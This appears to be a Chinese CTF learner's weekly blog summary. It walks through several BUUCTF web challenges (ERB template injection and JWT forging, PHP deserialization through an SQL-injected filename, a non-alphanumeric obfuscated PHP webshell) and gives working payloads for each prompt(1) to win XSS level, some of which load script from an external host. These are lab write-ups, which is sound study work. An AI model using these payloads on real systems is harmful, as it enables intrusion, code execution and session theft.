# Week1 Summary

- 继续刷BUUing
- 打了打 prompt(1) to win 靶场

## 刷题ing

### [SCTF2019]Flag Shop

evoA师傅出的题，这里简单讲讲预期解，非预期解也挺有意思的，具体可以看看[evoA师傅的博客](https://evoa.me/archives/15/)讲的更详细点。

#### ruby模板注入

在/robots.txt里可以看到提示，存在/filebak路由，直接给出了源码。

```ruby
require 'sinatra'
require 'sinatra/cookies'
require 'sinatra/json'
require 'jwt'
require 'securerandom'
require 'erb'

set :public_folder, File.dirname(__FILE__) + '/static'

FLAGPRICE = 1000000000000000000000000000
ENV["SECRET"] = SecureRandom.hex(64)

configure do
  enable :logging
  file = File.new(File.dirname(__FILE__) + '/../log/http.log',"a+")
  file.sync = true
  use Rack::CommonLogger, file
end

get "/" do
  redirect '/shop', 302
end

get "/filebak" do
  content_type :text
  erb IO.binread __FILE__
end

get "/api/auth" do
  payload = { uid: SecureRandom.uuid , jkl: 20}
  auth = JWT.encode payload,ENV["SECRET"] , 'HS256'
  cookies[:auth] = auth
end

get "/api/info" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  json({uid: auth[0]["uid"],jkl: auth[0]["jkl"]})
end

get "/shop" do
  erb :shop
end

get "/work" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  auth = auth[0]
  unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
  end

  if params[:do] == "#{params[:name][0,7]} is working" then
    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result
  end
end

post "/shop" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }

  if auth[0]["jkl"] < FLAGPRICE then

    json({title: "error",message: "no enough jkl"})
  else

    auth << {flag: ENV["FLAG"]}
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    json({title: "success",message: "jkl is good thing"})
  end
end


def islogin
  if cookies[:auth].nil? then
    redirect to('/shop')
  end
end
```

可以看出是ruby的erb模板注入，核心代码就是这个

```ruby
if params[:do] == "#{params[:name][0,7]} is working" then
    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result
end
```

if成立则会弹出name参数的前七个字符值，这里就限制了七字符的模板注入，erb模板的注入格式为`<%=%>`，显然这里就占了五个字符了那么我们可控的就只有两个字符，这里可以使用ruby的[预定义全局变量](https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html) `$'`，即会返回上次成功匹配右值的字符串。

> $'
>
> The string to the right of the last successful match.

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210810113513038.png)

tips：特殊字符需要urlencode

有秘钥了就直接[JWT](https://jwt.io/)一把梭。

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210810113831546.png)

flag_here

> flag{845aa3fa-8612-4c76-8f81-d6aa00f46882}

### [GXYCTF2019]StrongestMind

大数字计算器，写个脚本自动算就行了。

```python
import requests
import re


def calculate(n1, sl, n2):
    if '+' in sl:
        return n1 + n2
    if '-' in sl:
        return n1 - n2
    if '*' in sl:
        return n1 * n2
    if '/' in sl:
        return n1 / n2


url = "http://a3187c44-2492-4ad0-aac5-3bfbd8ad2de4.node4.buuoj.cn:81/"
s = requests.session()
res = s.get(url=url)
for i in range(1, 1005):
    char = re.search(r'><br>(\d*)(\D*)(\d*)<br><br><form', res.text)
    num1 = int(char.group(1))
    num2 = int(char.group(3))
    symbol = char.group(2)
    result = calculate(num1, symbol, num2)
    data = {
        "answer": result
    }
    res = s.post(url=url, data=data)
    if "flag{" in res.text:
        print(res.text)
        break
    print(f"[+]Now is:{i}")
```

> flag{b387e80e-8d04-454e-b5b4-720d176c82ba}



### [安洵杯 2019]不是文件上传

index最下面可以看到一段话。

> Hello, my colleague.
>
> Some of the features on our website have not been completed. I have uploaded the source code to github. When you have time, remember to continue.

提示可以去到作者的github仓库中找到源码。

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210812104433141.png)

下载源码下来代码审计，主要是show.php

```php
<?php
include("./helper.php");
$show = new show();
if($_GET["delete_all"]){
	if($_GET["delete_all"] == "true"){
		$show->Delete_All_Images();
	}
}
$show->Get_All_Images();

class show{
	public $con;

	public function __construct(){
		$this->con = mysqli_connect("127.0.0.1","root","root","pic_base");
		if (mysqli_connect_errno($this->con)){ 
   			die("Connect MySQL Fail:".mysqli_connect_error());
		}
	}

	public function Get_All_Images(){
		$sql = "SELECT * FROM images";
		$result = mysqli_query($this->con, $sql);
		if ($result->num_rows > 0){
		    while($row = $result->fetch_assoc()){
		    	if($row["attr"]){
		    		$attr_temp = str_replace('\0\0\0', chr(0).'*'.chr(0), $row["attr"]);
					$attr = unserialize($attr_temp);
				}
		        echo "<p>id=".$row["id"]." filename=".$row["filename"]." path=".$row["path"]."</p>";
		    }
		}else{
		    echo "<p>You have not uploaded an image yet.</p>";
		}
		mysqli_close($this->con);
	}

	public function Delete_All_Images(){
		$sql = "DELETE FROM images";
		$result = mysqli_query($this->con, $sql);
	}
}
?>
```

和helper.php

```php
<?php
class helper {
	protected $folder = "pic/";
	protected $ifview = False; 
	protected $config = "config.txt";
	// The function is not yet perfect, it is not open yet.

	public function upload($input="file")
	{
		$fileinfo = $this->getfile($input);
		$array = array();
		$array["title"] = $fileinfo['title'];
		$array["filename"] = $fileinfo['filename'];
		$array["ext"] = $fileinfo['ext'];
		$array["path"] = $fileinfo['path'];
		$img_ext = getimagesize($_FILES[$input]["tmp_name"]);
		$my_ext = array("width"=>$img_ext[0],"height"=>$img_ext[1]);
		$array["attr"] = serialize($my_ext);
		$id = $this->save($array);
		if ($id == 0){
			die("Something wrong!");
		}
		echo "<br>";
		echo "<p>Your images is uploaded successfully. And your image's id is $id.</p>";
	}

	public function getfile($input)
	{
		if(isset($input)){
			$rs = $this->check($_FILES[$input]);
		}
		return $rs;
	}

	public function check($info)
	{
		$basename = substr(md5(time().uniqid()),9,16);
		$filename = $info["name"];
		$ext = substr(strrchr($filename, '.'), 1);
		$cate_exts = array("jpg","gif","png","jpeg");
		if(!in_array($ext,$cate_exts)){
			die("<p>Please upload the correct image file!!!</p>");
		}
	    $title = str_replace(".".$ext,'',$filename);
	    return array('title'=>$title,'filename'=>$basename.".".$ext,'ext'=>$ext,'path'=>$this->folder.$basename.".".$ext);
	}

	public function save($data)
	{
		if(!$data || !is_array($data)){
			die("Something wrong!");
		}
		$id = $this->insert_array($data);
		return $id;
	}

	public function insert_array($data)
	{	
		$con = mysqli_connect("127.0.0.1","root","root","pic_base");
		if (mysqli_connect_errno($con)) 
		{ 
		    die("Connect MySQL Fail:".mysqli_connect_error());
		}
		$sql_fields = array();
		$sql_val = array();
		foreach($data as $key=>$value){
			$key_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $key);
			$value_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $value);
			$sql_fields[] = "`".$key_temp."`";
			$sql_val[] = "'".$value_temp."'";
		}
		$sql = "INSERT INTO images (".(implode(",",$sql_fields)).") VALUES(".(implode(",",$sql_val)).")";
		mysqli_query($con, $sql);
		$id = mysqli_insert_id($con);
		mysqli_close($con);
		return $id;
	}

	public function view_files($path){
		if ($this->ifview == False){
			return False;
			//The function is not yet perfect, it is not open yet.
		}
		$content = file_get_contents($path);
		echo $content;
	}

	function __destruct(){
		# Read some config html
		$this->view_files($this->config);
	}
}
?>
```

可以发现view\_files方法中file\_get\_contents，可以进行文件读取，而show.php中存在unserialize，那么就可以进行反序列化读取文件。

#### PHP反序列化

构造poc

```php
<?php

class helper{
    protected $config = "/flag";
    protected $ifview = true;
}

$x = new helper();
echo bin2hex(serialize($x));
```

使用十六进制编码是为了绕过protected。

#### sql注入

反序列化构造完成了，接下来就是看看如何到达入口。

从show.php中可以看出，入口是sql读取的attr键值，而我们在上传时会经过一个check()函数。

```php
public function check($info)
{
	$basename = substr(md5(time().uniqid()),9,16);
	$filename = $info["name"];
	$ext = substr(strrchr($filename, '.'), 1);
	$cate_exts = array("jpg","gif","png","jpeg");
	if(!in_array($ext,$cate_exts)){
		die("<p>Please upload the correct image file!!!</p>");
	}
    $title = str_replace(".".$ext,'',$filename);
    return array('title'=>$title,'filename'=>$basename.".".$ext,'ext'=>$ext,'path'=>$this->folder.$basename.".".$ext);
}
```

这里我们只有\$filename可控，而\$title的值为上传的文件名去掉后缀的值，即上传了一个文件名为a.png，则title为a。

于是我们可以控制title时后面的语句失效，从而达到控制变量的目的，这样attr的键值就可控了。

修改文件名上传。

> filename="1','1','1','1',0x4f3a363a2268656c706572223a323a7b733a393a22002a00636f6e666967223b733a353a222f666c6167223b733a393a22002a00696676696577223b623a313b7d)#.png"

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210812111351572.png)

上传后去show.php执行，就可以拿到flag了。

> flag{ab9b67fb-c05c-45ce-b223-c9bb1247dc34}

### [SUCTF 2018]GetShell

#### 无字母数字upload

找了找发现只有upload的点，还有黑名单。

```php
if($contents=file_get_contents($_FILES["file"]["tmp_name"])){
    $data=substr($contents,5);
    foreach ($black_char as $b) {
        if (stripos($data, $b) !== false){
            die("illegal char");
        }
    }     
} 
```

简单测试一下发现只给了一些字符，字母和数字都ban了。

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210813182603302.png)

异或也没了，那只能取反了，这里直接给poc。

```php
<?php
$__=[];
$_=($__==$__); // 1
$__=~(融); // a
$___=$__[$_];
$__=~(匆); // s
$___.=$__[$_].$__[$_];
$__=~(随); // e
$___.=$__[$_];
$__=~(千); // r
$___.=$__[$_];
$__=~(苦); // t
$___.=$__[$_];
$____=~(~(_)); // _
$__=~(诗); // P
$____.=$__[$_];
$__=~(尘); // O
$____.=$__[$_];
$__=~(欣); // S
$____.=$__[$_];
$__=~(站); // T
$____.=$__[$_];
$_=$$____;
$___($_[_]); // assert($_POST[_])
```

上传后在phpinfo的环境变量里可以看到flag。

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210813190419027.png)

## prompt(1) to win - XSS靶场练习

------

### 0x0

第一关没过滤东西，只需要闭合一下前面的__\"__就行了。

> \"\>\<script\>prompt(1)\</script\>

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210814131959530.png)

------

### 0x1

对于过滤__<__和__>__中的内容时，可以使用\<BODY标签进行绕过`<BODY onload="prompt(1)"`

> onload 事件在页面载入完成后立即触发。

或者使用<img标签进行绕过`<img src=# onerror="prompt(1)"`

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210814132452447.png)

```
<BODY onload="prompt(1)"
      
<img src=# onerror="prompt(1)"
```

------

### 0x2

这关把`=` 和 `(`ban掉了，但是可以使用svg标签绕过

> SVG属于支持XML解析，所以那么我们就很好理解了，因为下xml支持在标签内解析HTML实体字符，所以在在XML中`&#40;`会被解析成`（`

[编码网站](https://tool.oschina.net/encode)

[浅谈XSS的小技巧与浏览器编码](http://pupiles.com/xss.html)

```js
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}
```

payload:

```html
<svg><script>prompt&#40;1)</script>
```

------

### 0x3

```js
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}
```

这关把输入口放在了注释标签中，且把注释标签的闭合过滤了，找找其他的闭合。

```
//
<!-- --!> 2012年后可用
/**/
```

payload:

```js
--!><script>prompt(1)</script>
```

------

### 0x4

```js
function escape(input) {
    // make sure the script belongs to own site
    // sample script: http://prompt.ml/js/test.js
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        var script = document.createElement('script');
        script.src = input;
        return script.outerHTML;
    } else {
        return 'Invalid resource.';
    }
}
```

这关利用正则对字符串进行了过滤，开头必须为`http://prompt.ml/`。

原本以为是可以在中间构造语句闭合进行绕过的，但是发现会转为实体字符，这条线走不通。

看了看师傅们的wp，浏览器是支持这种url写法的

```
https://username:password@attacker.com，但是https://username:password/@attacker.com不行，这里由于用了decodeURIComponent，所以可以用%2f解码绕过。
```

这里要用到自己的服务器，直接传个`prompt(1)`的js文件上去，然后访问。

tips：这种url写法chrome并不支持，火狐还可以用。

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817131241835.png)

还有一种方法是直接开phpstudy的服务器，这样就可以不用自己的服务器打。

payload:

```
http://prompt.ml%2f@localhost/xss.js
```

------

### 0x5

```js
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}
```

这关过滤了`>`、`onxxxx=`、`focus`，可以用`"`闭合`value`，然后自定义`type="image"`，最后利用换行符绕过`onxxxx=`

payload:

```
" type="image" src=# onerror
="prompt(1)
```

------

### 0x6

```
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}
```

这关通过demo发现总共有`action`、`method`、`name`和`value`是可控的。

```html
<form action="http://httpbin.org/post" method="post"><input name="name" value="Matt"></form>                         
<script>                                                  
    // forbid javascript: or vbscript: and data: stuff    
    if (!/script:|data:/i.test(document.forms[0].action)) 
        document.forms[0].submit();                       
    else                                                  
        document.write("Action forbidden.")               
</script>
```

if语句通过了，则会submit我们的action值。这里可以利用 `javascript:` js伪协议进行js代码执行，然后可以通过控制 `name` 的值，破坏窗口的action属性，进而绕过 `if`。

上测试:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
    <form action="javascript:prompt(1)" method="post"><input name="action" value="test"></form>
    <script type="text/javascript">
        alert(document.forms[0].action)
    </script>
</body>
</html>
```

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817145123855.png)

可以发现输出了我们想要的东西。

payload:

```
javascript:prompt(1)#{"action":"Matt"}
```

------

### 0x7

```js
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}
```

这关限制了只能有12个字符，可以用js的多行注释来注释掉多出来的标签。

payload:

```
"><script>/*#*/prompt(1/*#*/)</script>
```

result:

```
<p class="comment" title=""><script>/*"></p>
<p class="comment" title="*/prompt(1/*"></p>
<p class="comment" title="*/)</script>"></p>
```

tips：注释符也算在长度中。

------

### 0x8

```js
function escape(input) {
    // prevent input from getting out of comment
    // strip off line-breaks and stuff
    input = input.replace(/[\r\n</"]/g, '');

    return '                                \n\
<script>                                    \n\
    // console.log("' + input + '");        \n\
</script> ';
}
```

这题绕单行注释，可以换行进行绕过，但是ban 掉了两个换行符，这里可以用到 unicode 编码进行绕过，然后用 js 的注释 `->`注释掉后面的 `");`

> \u2028，Unicode行分隔符
>
> \u2029，Unicode段落分隔符

这题好像有坑，无法复现，过！

------

### 0x9

```js
function escape(input) {
    // filter potential start-tags
    input = input.replace(/<([a-zA-Z])/g, '<_$1');
    // use all-caps for heading
    input = input.toUpperCase();

    // sample input: you shall not pass! => YOU SHALL NOT PASS!
    return '<h1>' + input + '</h1>';
}
```

`toUpperCase()`存在漏洞，不仅会转换英文字母，也会转换一些 `Unicode` 字符，比如 `ſ` 传入后可转换为相似的 `S` ，这样就可以绕过开始的 `replace`。

payload:

```
<ſcript src="YOUR_IP/xss.js"></script>
```

------

### 0xA

```js
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}
```

这关比较简单，就把单引号替换为空，只要在 `prompt(1)` 中间加个单引号就行了。

payload:

```
pro'mpt(1)
```

------

### 0xB

```js
function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';

    // directly "parse" data in script context
    return '                                \n\
<script>                                    \n\
    var data = ' + dataString + ';          \n\
    if (data.action === "login")            \n\
        document.write(data.message)        \n\
</script> ';
}
```

小 trick ，利用字母操作符构造 `(prompt(1)) in "."` ，虽然会报错，但是仍可以弹窗。

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817171942102.png)

由于 js 定义对象时同一属性名的会先取后面的，所以可以利用这个 trick 实现 XSS。

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817172250539.png)

payload：

```
"(prompt(1))in"
```

------

### 0xC

```js
function escape(input) {
    // in Soviet Russia...
    input = encodeURIComponent(input).replace(/'/g, '');
    // table flips you!
    input = input.replace(/prompt/g, 'alert');

    // ノ┬─┬ノ ︵ ( \o°o)\
    return '<script>' + input + '</script> ';
}
```

这关用到三个函数。

> parseInt() // 可以将字符串通过进制转换为数字
>
> toString() // 可以将数字通过进制转换回字符串
>
> eval() // 可以将字符串当作正常语句执行

直接给出测试

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817173413085.png)

payload: 

```
eval(630038579..toString(30))(1) ==> prompt(1)
```

------

### 0xD

```js
function escape(input) {
    // extend method from Underscore library
    // _.extend(destination, *sources) 
    function extend(obj) {
        var source, prop;
        for (var i = 1, length = arguments.length; i < length; i++) {
            source = arguments[i];
            for (prop in source) {
                obj[prop] = source[prop];
            }
        }
        return obj;
    }
    // a simple picture plugin
    try {
        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
        var data = JSON.parse(input);
        var config = extend({
            // default image source
            source: 'http://placehold.it/350x150'
        }, JSON.parse(input));
        // forbit invalid image source
        if (/[^\w:\/.]/.test(config.source)) {
            delete config.source;
        }
        // purify the source by stripping off "
        var source = config.source.replace(/"/g, '');
        // insert the content using mustache-ish template
        return '<img src="{{source}}">'.replace('{{source}}', source);
    } catch (e) {
        return 'Invalid image data.';
    }
}
```

这关有两个知识点

- js 对象的默认属性 `__proto__`
- js 的 replace 字符串特殊替换模式

 首先是 js 对象的默认属性

> 每个对象都会在其内部初始化一个属性，就是`__proto__`，当我们访问对象的属性时，如果对象内部不存在这个属性，那么就会去`__proto__`里面找这个属性，这个`__proto__`又会有自己的`__proto__`，一直这样找下去。

上测试！！

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817200920171.png)

所以当题目 `delete config.source`时，后面用到的 `config.source`  就是 `__proto__` 属性里的，这样就可控了。

然后是 js 的 replace 字符串特殊替换模式，主要看这个，或者[直接去网站看](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#description)。

| Pattern       | Inserts                                                      |
| :------------ | :----------------------------------------------------------- |
| __\$\$__      | Inserts a `"$"`.                                             |
| __\$&__       | Inserts the matched substring.                               |
| __\$`__       | Inserts the portion of the string that precedes the matched substring. |
| __\$'__       | Inserts the portion of the string that follows the matched substring. |
| __\$n__       | Where `n` is a positive integer less than 100, inserts the `n`th parenthesized submatch string, provided the first argument was a [`RegExp`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp) object. Note that this is `1`-indexed. If a group `n` is not present (e.g., if group is 3), it will be replaced as a literal (e.g., `$3`). |
| __\$\<Name>__ | Where `Name` is a capturing group name. If the group is not in the match, or not in the regular expression, or if a string was passed as the first argument to `replace` instead of a regular expression, this resolves to a literal (e.g., `$<Name>`). Only available in browser versions supporting named capturing groups. |

直接上测试比较好理解点。

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817201818379.png)

这样就可以做到既保留了 \<img 标签，又可以控制输入，这样就可以做到XSS了。

直接上payload:

```
{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}
```

------

### 0xE

```js
function escape(input) {
    // I expect this one will have other solutions, so be creative :)
    // mspaint makes all file names in all-caps :(
    // too lazy to convert them back in lower case
    // sample input: prompt.jpg => PROMPT.JPG
    input = input.toUpperCase();
    // only allows images loaded from own host or data URI scheme
    input = input.replace(/\/\/|\w+:/g, 'data:');
    // miscellaneous filtering
    input = input.replace(/[\\&+%\s]|vbs/gi, '_');

    return '<img src="' + input + '">';
}
```

第一个 replace 是将 `//` 或 `(任意字母数字):` 替换为 `data:`。

第二个 replace 是将 __\\__ 、 __&__ 、__+__ 、__%__ 和空白字符替换为 _____ 。

又因为有 toUpperCase() 在，所以注入 XSS 是不大好搞的，尝试引用外部脚本。

尝试了下，把我自己的服务器放上去拿不到全大写字母加数字的 base64 编码，就先放 payload 在这了

```
"><IFRAME/SRC="x:text/html;base64,ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJPD4=
```

------

### 0xF

```js
function escape(input) {
    // sort of spoiler of level 7
    input = input.replace(/\*/g, '');
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');

    return segments.map(function(title, index) {
        // title can only contain 15 characters
        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
    }).join('\n');
}
```

这关虽然把 `*` 替换掉了，但是可以利用 `<svg>` 标签去使用 `<!-- -->`替代多行注释。

payload:

```
"><svg><!--#--><script><!--#-->prompt(1<!--#-->);<!--#--></script>
```

```
<p class="comment" title=""><svg><!--" data-comment='{"id":0}'></p>
<p class="comment" title="--><script><!--" data-comment='{"id":1}'></p>
<p class="comment" title="-->prompt(1<!--" data-comment='{"id":2}'></p>
<p class="comment" title="-->);<!--" data-comment='{"id":3}'></p>
<p class="comment" title="--></script>" data-comment='{"id":4}'></p>
```

## Summary









